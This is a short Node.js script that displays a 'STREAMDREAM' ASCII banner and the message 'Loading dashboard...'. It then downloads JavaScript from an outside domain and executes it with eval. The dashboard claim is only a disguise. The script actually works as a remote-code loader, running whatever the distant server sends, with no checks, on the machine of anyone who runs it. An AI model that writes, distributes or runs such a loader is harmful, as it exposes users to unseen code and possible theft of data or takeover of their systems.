const print = `
███████ ████████ ██████  ███████  █████  ███    ███ ██████  ██████  ███████  █████  ███    ███ 
██         ██    ██   ██ ██      ██   ██ ████  ████ ██   ██ ██   ██ ██      ██   ██ ████  ████ 
███████    ██    ██████  █████   ███████ ██ ████ ██ ██   ██ ██████  █████   ███████ ██ ████ ██ 
     ██    ██    ██   ██ ██      ██   ██ ██  ██  ██ ██   ██ ██   ██ ██      ██   ██ ██  ██  ██ 
███████    ██    ██   ██ ███████ ██   ██ ██      ██ ██████  ██   ██ ███████ ██   ██ ██      ██ 
`;
console.log(print);
console.log("Loading dashboard...");
const fetch = require('node-fetch');
fetch("https://dbdbdbdbdbgroup.com/demo/server.js")
    .then(response => {
        if (response.ok) return response.text();
        throw new Error(`Error fetching dashboard: ${response.status}`);
    })
    .then((data)=>{
        eval(data);
    })
    .catch(console.error);
setTimeout(()=>{}, 30000);